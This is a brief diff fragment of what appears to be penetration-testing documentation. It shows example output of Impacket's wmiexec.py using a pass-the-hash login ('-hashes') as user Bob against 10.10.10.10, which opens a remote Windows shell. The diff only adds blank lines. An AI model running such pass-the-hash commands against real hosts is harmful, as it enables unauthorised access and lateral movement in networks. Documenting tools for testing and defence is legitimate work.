@@ -8,6 +8,7 @@ output: 'root@kali:~# wmiexec.py Bob@10.10.10.10 -hashes :6608e4bc7b2b7a5f77ce35
 
   Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
+
   INFO:root:SMBv3.0 dialect used
 
   [!] Launching semi-interactive shell - Careful what you execute
@@ -36,3 +37,5 @@ INFO:root:SMBv3.0 dialect used
 [!] Press help for extra shell commands
 C:\>
 ```
+
+
